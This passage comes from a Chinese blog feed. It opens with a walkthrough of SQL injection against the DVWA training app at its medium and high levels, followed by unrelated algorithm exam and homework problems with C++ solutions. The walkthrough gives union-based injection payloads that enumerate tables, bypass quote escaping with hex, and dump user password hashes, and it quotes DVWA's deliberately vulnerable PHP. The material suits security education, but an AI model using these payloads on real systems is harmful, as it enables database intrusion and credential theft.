title="级别：medium"></a>级别：medium</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 </p><p><img src="https://s2.ax1x.com/2019/11/11/MlYjiV.png" alt="MlYjiV.png"></p><p> 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 </p><h4 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a><strong>判断是否存在注入，注入是字符型还是数字型</strong></h4><p> <code>抓包更改参数id为1&#39; or 1=1 # 报错： #是注释作用</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlNW38.png" alt="MlNW38.png"></p><p><img src="https://s2.ax1x.com/2019/11/11/MlNhjg.png" alt="MlNhjg.png"></p><p><img src="https://s2.ax1x.com/2019/11/11/MlNIBj.png" alt="MlNIBj.png"></p><p> <code>抓包更改参数id为1 or 1=1 #，查询成功：</code> </p><p><img src="https://s2.ax1x.com/2019/11/11/MlUAgO.png" alt="MlUAgO.png"></p><p><img src="https://s2.ax1x.com/2019/11/11/MlUEvD.png" alt="MlUEvD.png"></p><p> <code>说明存在数字型注入。</code></p><p> 由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。 </p><h4 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a><strong>猜解SQL查询语句中的字段数</strong></h4><p><code>抓包更改参数id为1 order by 2 #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlwIzV.png" alt="MlwIzV.png"></p><p><code>抓包更改参数id为1 order by 3 #，报错：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlwLdJ.png" alt="MlwLdJ.png"></p><p><code>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</code></p><h4 id="确定显示的字段顺序"><a href="#确定显示的字段顺序" class="headerlink" title="确定显示的字段顺序"></a><strong>确定显示的字段顺序</strong></h4><p> <code>抓包更改参数id为1 union select 1,2 #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/Ml0JWq.png" alt="Ml0JWq.png"></p><p> 说明执行的SQL语句为select First name,Surname from 表 where ID=id… </p><h4 id="获取当前数据库-1"><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a><strong>获取当前数据库</strong></h4><p> <code>抓包更改参数id为1 union select 1,database() #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/Ml0j0g.png" alt="Ml0j0g.png"></p><p><code>说明当前的数据库为dvwa。</code></p><h4 id="获取数据库中的表-1"><a href="#获取数据库中的表-1" class="headerlink" title="获取数据库中的表"></a><strong>获取数据库中的表</strong></h4><p><code>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlBK91.png" alt="MlBK91.png"></p><p><code>说明数据库dvwa中一共有两个表，guestbook与users。</code></p><h4 id="获取表中的字段名-1"><a href="#获取表中的字段名-1" class="headerlink" title="获取表中的字段名"></a><strong>获取表中的字段名</strong></h4><p><code>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/Mls0jx.png" alt="Mls0jx.png"></p><p> 这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过 ‘’ </p><p><code>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功：</code><img src="https://s2.ax1x.com/2019/11/11/MlrFwF.png" alt="MlrFwF.png"></p><p><code>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</code></p><h4 id="下载数据-1"><a href="#下载数据-1" class="headerlink" title="下载数据"></a><strong>下载数据</strong></h4><p><code>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/11/MlraOf.png" alt="MlraOf.png"></p><h3 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h3><h4 id="SQL-Injection-Source"><a href="#SQL-Injection-Source" class="headerlink" title="SQL Injection Source"></a>SQL Injection Source</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a><strong>分析：</strong></h4><p> 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 </p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a><strong>漏洞利用:</strong></h4><p> 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 </p><p><code>输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</code></p><p><img src="https://s2.ax1x.com/2019/11/12/M3q1r6.png" alt="M3q1r6.png"></p><p><strong>特别注意：</strong>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p><p><strong>参考链接：</strong> <a href="https://www.jianshu.com/p/e51cd8f15a84" target="_blank" rel="noopener">https://www.jianshu.com/p/e51cd8f15a84</a> </p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法实验考试</title>
      <link href="/2019/10/28/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E8%80%83%E8%AF%95/"/>
      <url>/2019/10/28/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E8%80%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>算法实验上机考试</p><a id="more"></a><h2 id="问题-A-进制转换"><a href="#问题-A-进制转换" class="headerlink" title="问题 A: 进制转换"></a>问题 A: 进制转换</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个十进制正整数N，请将其转换为十六进制并输出。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>一个十进制正整数N。( 1 &lt;= N &lt;= 2×10<sup>9</sup> )</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>输出N对应的十六进制，用数字 0<del>9 以及大写字母 A</del>F 来表示。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7E3</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>递归</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> *t=<span class="string">"0123456789ABCDEF"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f(n/<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;t[n%<span class="number">16</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">    f(m);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-背包问题"><a href="#问题-B-背包问题" class="headerlink" title="问题 B: 背包问题"></a>问题 B: 背包问题</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>在N件物品取出若干件放在容量为W的背包里，每件物品的体积为W1，W2……Wn（Wi为整数），与之相对应的价值为P1,P2……Pn（Pi为整数）。求背包能够容纳的最大价值。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>第1行，2个整数，N和W中间用空格隔开。N为物品的数量，W为背包的容量。(1 &lt;= N &lt;= 1000，1 &lt;= W &lt;= 105)<br>第2 ~ N+1行，每行2个整数，Wi和Pi，分别是物品的体积和物品的价值。(1 &lt;= Wi &lt;= 10<sup>5</sup>，1 &lt;= Pi &lt;= 2×10<sup>9</sup>)</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>输出可以容纳的最大价值。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3 6</span><br><span class="line">2 5</span><br><span class="line">3 8</span><br><span class="line">4 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><p>肯定是递归做，但是dp数组用二维的不知道为什么总是数组超限，考完和同学交流了一下，发现不是个例，考试的时候我还提交了一维的写法，但是时间又超限了，时间卡在1040，差40就可以过了，但是我交了30多遍也没用，代码就不贴出来了（我还是太弱了）。</p><h2 id="问题-C-迷宫问题"><a href="#问题-C-迷宫问题" class="headerlink" title="问题 C: 迷宫问题"></a>问题 C: 迷宫问题</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个N行M列的迷宫，其中’.’代表空地，可以通行；’#’代表障碍物，无法通行；’S’代表起点；’T’代表终点；’’S’和’T’这两个位置也是空地，可以通行。在迷宫中可以向上、下、左、右四个不同的方向行走，请你判断从起点出发是否可以走到终点？如果可以，请你计算到达终点最少需要走几步。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>第1行，2个整数，N和M，中间用空格隔开。N为迷宫的行，M为迷宫的列。(2 &lt;= N,M &lt;= 1000)<br>第2 ~ N+1行，每行M个字符，对应整个迷宫的布局，输入数据中保证只有’.’,’#’,’S’,’T’这四种字符，并且只有一个’S’，只有一个’T’。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>如果可以到达终点，输出两行，第一行输出”YES”，第二行输出一个整数代表最少需要走几步。如果无法到达终点，输出”NO”。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4 9</span><br><span class="line">#S#.#.#T#</span><br><span class="line">#....##.#</span><br><span class="line">#.##....#</span><br><span class="line">#....####</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">10</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><p>回溯，但是考试前觉得不会考，也没怎么看，拿到手有思路，就是没写出来（话说好像和数据结构实验的最后一题差不多）</p><h2 id="问题-D-素数问题"><a href="#问题-D-素数问题" class="headerlink" title="问题 D: 素数问题"></a>问题 D: 素数问题</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>葬爱家族的Halobin近在研究素数，他想知道对于两个整数x和y（x&gt;y），能否找到若干个素数p1,p2,…pk，使得x=y+p1+p2+…+pk。注意素数可以无限重复使用，例如x=9,y=1，那么只需要用4个2就可以了，即9=1+2+2+2+2.</p><p>请你帮他解决这个问题。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>第一行输入数据组数T(T&lt;100)</p><p>接下来T行每行输入两个整数x和y（0&lt;y&lt;x&lt;10<sup>9</sup>）</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>如果能找到若干个素数满足条件，输出“YES”，否则输出“NO”</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">100 98</span><br><span class="line">42 36</span><br><span class="line">100000000 1</span><br><span class="line">41 40</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">YES</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><p>这题本是签到题，但是老师中途说了思路（两数之差是1就不可能，不是就可以），我感觉是实在看不下去我们做的题了，所以才来告诉我们答案，感觉智商被按在地上摩擦。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t,x,y;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">if</span>((x-y)&gt;<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"YES"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"NO"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-锯木棒"><a href="#问题-E-锯木棒" class="headerlink" title="问题 E: 锯木棒"></a>问题 E: 锯木棒</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>xiaok大佬最近再雇佣工人给他掰木棒。把一根长为L的木棒锯成两段，他需要支付给工人L元钱。xiaok大佬一开始只有长为L的一根木棒，他想把它锯成n段，每段长度分别为L1,L2,…,Ln，问xiaok大佬最少要付给工人多少钱？</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>第一行两个整数n,L(1&lt;n&lt;10<sup>3</sup>,n&lt;L&lt;10<sup>9</sup>)</p><p>第二行n个整数L1,L2,…,Ln（0&lt;Li&lt;L,且保证L1+L2+…+Ln=L）</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>输出一个整数，表示最小花费</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3 21</span><br><span class="line">8 5 8</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">34</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>先把木棒锯成13和8两段，花费21，再把13那段锯成5和8，花费13，总花费13+21=34</p><p>很明显，贪心，设个优先级队列，（参考哈夫曼树）</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span>&amp; a,<span class="keyword">int</span>&amp; b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp1&gt; pq;</span><br><span class="line">    <span class="keyword">int</span> n,l,s;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        pq.push(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(pq.size()&gt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a=pq.top();</span><br><span class="line">        pq.pop();</span><br><span class="line">        <span class="keyword">int</span> b=pq.top();</span><br><span class="line">        pq.pop();</span><br><span class="line">        sum=sum+a+b;</span><br><span class="line">        pq.push(a+b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法实验作业</title>
      <link href="/2019/10/26/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A/"/>
      <url>/2019/10/26/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<p>算法作业。</p><a id="more"></a><h2 id="问题-A-凯撒加密法"><a href="#问题-A-凯撒加密法" class="headerlink" title="问题 A: 凯撒加密法"></a>问题 A: 凯撒加密法</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>​    凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。<br>​    例如，当偏移量是左移3的时候：<br>明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC<br>使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。例如：<br>​    明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG<br>​    密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ<br>​    现在给定你一个字符串S（长度不会超过1000000）和一个整数k（-1000000000&lt;=k&lt;=1000000000），分别代表接受者收到的密文和在加密该密文时向后的偏移量，你的任务是计算出原来的明文<br>​    注意：只有字母在加密时才会发生偏移，其它字符保持不变</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>​    输入包含多组数据，其中第一行为数据组数T（T&lt;=10）<br>​    每组数据第一行为一个字符串S，由数字、字母以及常见字符组成（不含空格），第二行为一个整数k代表加密时向后的偏移量（|S|&lt;=1000000,-1000000000&lt;=k&lt;=1000000000）</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>​    对每组数据，输出一行字符串，代表输入中的密文对应的明文。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">DEFGHIJKLMNOPQRSTUVWXYZABC</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">        k=k%<span class="number">26</span>;</span><br><span class="line">        <span class="keyword">int</span> len=s.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;=<span class="string">'A'</span>&amp;&amp;s[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s[i]=s[i]-k;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&lt;<span class="string">'A'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]+<span class="number">26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&gt;<span class="string">'Z'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]<span class="number">-26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span 